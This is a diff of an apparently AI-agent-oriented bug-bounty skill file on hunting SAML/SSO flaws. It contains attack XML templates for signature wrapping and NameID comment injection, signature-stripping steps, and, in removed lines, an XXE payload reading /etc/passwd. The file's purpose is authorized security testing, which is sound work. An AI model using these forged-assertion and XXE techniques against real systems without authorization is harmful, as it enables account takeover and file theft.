@@ -1,122 +1,109 @@
 ---
 name: hunt-saml
-description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
+description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.com<!--evil-->@attacker.com → some parsers see admin@target.com), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window), encrypted-assertion branch skip, parser-differential (two XML parsers). Tools: SAML Raider Burp extension, samlmagic, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
 ---
 
-## 20. SAML / SSO ATTACKS
-> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.
+# HUNT-SAML — SAML / SSO
 
-### Attack Surface
-```bash
-# Find SAML endpoints
-cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
-# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
+## Rails
+- In-scope only. Use **your** IdP test user / captured assertion from **your** login. Do not impersonate a real third-party victim.
+- Read-only until you have a captured `SAMLResponse`; then mutate **copies** against ACS. One successful ATO on a test user is enough.
+- No brute-force of NameIDs / passwords. One targeted NameID swap (test-user → second test-user or documented admin mailbox you own) proves impersonation.
+- STOP at draft. Claim only a session issued for an identity you were not entitled to.
+
+## Decision tree (any SP)
+1. **Find ACS / SSO:** `/saml`, `/saml/acs`, `/SAML2/POST`, `/Shibboleth.sso`, `/adfs/ls`, `/auth/saml/callback`, `?SAMLResponse=`, `RelayState`. Libraries: `ruby-saml`, `pysaml2`, `OneLogin`, `simplesamlphp`, `samlify`, `xml-crypto`, ADFS, Okta/Azure as IdP.
+2. Capture a **valid** `SAMLResponse` (POST binding = raw base64; Redirect = deflate then base64 — not gzip).
+3. Walk attacks in yield order: **sig strip → comment/NameID → XSW / parser-diff → encrypted-assertion branch → aud/dest/recipient → replay → XXE → RelayState**.
+4. Success = SP issues a session as **another identity** (NameID or privileged AttributeStatement). XML that parses but does not change the auth decision is not Critical.
+
+## Attack surface
+```
+/saml /saml/acs /sso/saml /auth/saml/callback /Shibboleth.sso
+/adfs/ls /SAML2/POST /login/callback ?SAMLResponse= RelayState
+metadata.xml  SPSSODescriptor  AssertionConsumerService
 ```
 
-### Attack 1: XML Signature Wrapping (XSW)
-```xml
-<!-- BEFORE: valid assertion by user@company.com -->
-<saml:Response>
-  <saml:Assertion ID="legit">
-    <NameID>user@company.com</NameID>
-    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
-  </saml:Assertion>
-</saml:Response>
+```bash
+echo "$SAML_B64" | base64 -d | xmllint --format - > saml.xml   # POST binding
+# Redirect binding:
+python3 -c "import sys,base64,zlib; print(zlib.decompress(base64.b64decode(sys.argv[1]),-15).decode())" "$SAML_B64"
+```
 
-<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
-     App processes the FIRST assertion found = evil. -->
-<saml:Response>
+## Attack matrix
+
+| # | Class | What to do | Confirm |
+|---|---|---|---|
+| 1 | **Signature stripping** | Delete `<ds:Signature>` (and encrypted-sig variants). Change `<NameID>` to a second test identity. Re-encode, POST to ACS. | Session as the swapped identity. `wantAssertionsSigned=false` / verify skipped. |
+| 2 | **Comment injection** | `<NameID>admin@sp.example.com<!---->.attacker.com</NameID>` (you register/control the full string as IdP NameID). Canonicalization **without-comments** signs `admin@sp.example.com.attacker.com`; some text extractors read only `admin@sp.example.com`. ruby-saml CVE-2017-11428 / CVE-2024-45409 family. | Login as the **prefix** identity, not the IdP account. |
+| 3 | **XSW (signature wrapping)** | Keep signed assertion intact; insert a **sibling/parent** unsigned assertion the SP consumes first. Signature still covers original `#ID`. | Business logic uses unsigned NameID/attrs; verifier sees signed node. |
+| 4 | **Parser differential** | Two parsers (e.g. REXML vs Nokogiri — GitHub Enterprise CVE-2025-25291/25292): inject sibling `<Assertion>` so verifier and consumer resolve **different nodes** for the same XPath. | Signature valid + consumed NameID is attacker-controlled. |
+| 5 | **Encrypted-assertion branch** | If `EncryptedAssertion` is enabled, forge on the code path that decrypts **then** fails to re-verify (GitHub GHES CVE-2024-4985 class). | Unsigned/forged assertion accepted only when encryption flag on. |
+| 6 | **Audience / Destination / Recipient / InResponseTo** | Replay assertion issued for SP-A against SP-B; drop `<AudienceRestriction>`; change `Recipient` ACS URL; replay `InResponseTo` against a fresh login. | Cross-IdP / cross-SP session (Slack confused-deputy class). |
+| 7 | **Replay / NotOnOrAfter** | Submit the same `SAMLResponse` twice; submit after `NotOnOrAfter`; skew `NotBefore`. | Second ACS POST still issues a session. |
+| 8 | **IdP / key confusion** | Assertion signed by **your** IdP (or self-signed) presented to SP that does not pin IdP cert / `Issuer`. | SP trusts attacker IdP. |
+| 9 | **AttributeStatement priv-esc** | Leave NameID as your user; inject `isAdmin` / `groups=Admins` / `role=site_admin` **inside** the signed vs unsigned node (pairs with XSW). | Privileged app role, not just display name. |
+| 10 | **XXE in SAML XML** | DOCTYPE + external entity in `SAMLResponse` (`hunt-xxe`). Many SPs disable DTD — still probe once. | File/SSRF data in error, log, or NameID render — unique OOB marker. |
+| 11 | **RelayState** | Treat as open redirect / login CSRF (`hunt-open-redirect`, `hunt-csrf`). | Redirect or bound state not validated. |
+
+### Signature strip
+```
+1. Decode → saml.xml
+2. Delete every <Signature>…</Signature>
+3. Set NameID to TEST_B identity you own (or a role-bearing attribute)
+4. POST binding: base64 -w0 saml.xml  (no compression)
+   Redirect: raw DEFLATE then base64, then URL-encode
+5. POST to ACS with original RelayState
+```
+
+### XSW shape (XSW1-style sibling)
+```xml
+<samlp:Response>
   <saml:Assertion ID="evil">
-    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
+    <saml:Subject><saml:NameID>admin@sp.example.com</saml:NameID></saml:Subject>
   </saml:Assertion>
   <saml:Assertion ID="legit">
-    <NameID>user@company.com</NameID>
-    <ds:Signature><!-- Valid --></ds:Signature>
+    <saml:Subject><saml:NameID>you@sp.example.com</saml:NameID></saml:Subject>
+    <ds:Signature>… Reference URI="#legit" …</ds:Signature>
   </saml:Assertion>
-</saml:Response>
+</samlp:Response>
 ```
+SAML Raider (Burp) enumerates XSW1–XSW8; try each once. Do not stop at the first XML error — parsers fail closed differently per variant.
 
-### Attack 2: Comment Injection in NameID
+### Comment / C14N mismatch
 ```xml
-<!-- Attacker registers/controls account: admin@company.com.evil.com -->
-<NameID>admin@company.com<!---->.evil.com</NameID>
-<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
-     digest): "admin@company.com.evil.com" — the value the signature covers. -->
-<!-- App's XML processor also strips the comment but only reads the text node
-     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
-     identity than was signed. The discrepancy is the bug. -->
-<!-- Works when signer's C14N and app's text extraction disagree on comments.
-     CVE-2017-11428 (Ruby-SAML / OneLogin), CVE-2016-5697. -->
+<NameID>victim@company.com<!---->.evil.com</NameID>
 ```
+Works only when **signer's C14N** and **app text extraction** disagree on comments. Also try XML namespace prefix tricks and control chars in email (`\r` / trailing NUL) for domain-enforcement bypass (H1-class SAML signup).
 
-### Attack 3: Signature Stripping
-```
-1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
-2. Delete the entire <Signature> element
-3. Change NameID to admin@company.com
-4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
-5. Submit — if server doesn't verify signature presence = admin ATO
-```
+## Binding notes
+| Binding | Encode | Pitfall |
+|---|---|---|
+| POST | raw base64 of XML | Do **not** deflate |
+| Redirect | raw DEFLATE (zlib -15) + base64 + URL-encode | gzip ≠ DEFLATE; zlib header will fail |
 
-### Attack 4: XXE in SAML Assertion
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<saml:Assertion>
-  <NameID>&xxe;</NameID>
-</saml:Assertion>
-```
+## Validation
+- **Session as another identity:** `/me` / app UI shows TEST_B (or admin) unique marker, not your original NameID. Body-diff vs your baseline session.
+- **Negative control:** unmodified assertion still logs in as you; garbage XML is rejected.
+- **Privilege:** changing `locale` / displayName is **not** ATO. Need NameID, `AuthnContext`, or role-bearing attributes to change the authz decision.
+- **OOB:** XXE/`jku`-like metadata fetch → unique Collaborator. Sig-strip ATO is in-band (issued cookie).
+- Reproduce twice from a fresh browser (capture → mutate → ACS).
 
-### Attack 5: NameID Manipulation
-```
-Test these NameID values:
-- admin@company.com (generic admin)
-- administrator@company.com
-- support@target.com
-- Any email found in disclosed reports for this program
-- ${7*7} (SSTI if NameID gets rendered in a template)
-```
+**Severity:** XSW / sig-strip / parser-diff → any-user or admin ATO = **Critical**. Comment injection to a specific mailbox = **High–Critical**. Audience fail enabling cross-SP replay = **High**. XXE file read = **High** (or SSRF). RelayState-only redirect = hand to `hunt-open-redirect` (Low unless token leak).
 
-### Tools
-```bash
-# SAMLRaider (Burp extension) — automated XSW testing
-# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab
+## Chains
+| Primitive | Compose into | Impact |
+|---|---|---|
+| XSW / sig-strip NameID | SP issues session then OAuth token | Admin API (`hunt-oauth`, `hunt-ato`) |
+| Audience not checked | Assertion from IdP-A accepted at SP-B | Cross-tenant / partner-portal (`hunt-auth-bypass`) |
+| Encrypted-assertion branch | `site_admin` provision | GHES-class full admin |
+| XXE in ACS | File read of IdP cert / secrets | Forge forever (`hunt-xxe`) |
+| RelayState open redirect | Token in URL after SSO | ATO (`hunt-open-redirect`) |
 
-# Manual workflow:
-echo "BASE64_SAML" | base64 -d > saml.xml
-# Edit saml.xml
-base64 -w0 saml.xml  # Re-encode
-# URL-encode the result before sending as SAMLResponse parameter
-```
+Cross-refs: `hunt-ato`, `hunt-auth-bypass`, `hunt-oauth`, `hunt-xxe`, `security-arsenal`, `triage-validation`.
 
-### SAML Triage
-```
-XSW successful   = Critical (ATO any user)
-Sig stripping    = Critical (ATO any user)
-Comment injection = High (ATO admin)
-XXE in assertion = High (file read / SSRF)
-NameID manip     = Medium/High (depends on what NameID maps to)
-```
-
----
-
-## Related Skills & Chains
-
-- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.com` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
-- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
-- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
-- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
-- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
-- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.
-
-## Before you report — dedup gate
-
-Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
-order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:
-
+## Dedup gate
 ```bash
 python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
 ```
-
-`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
-(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
+`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
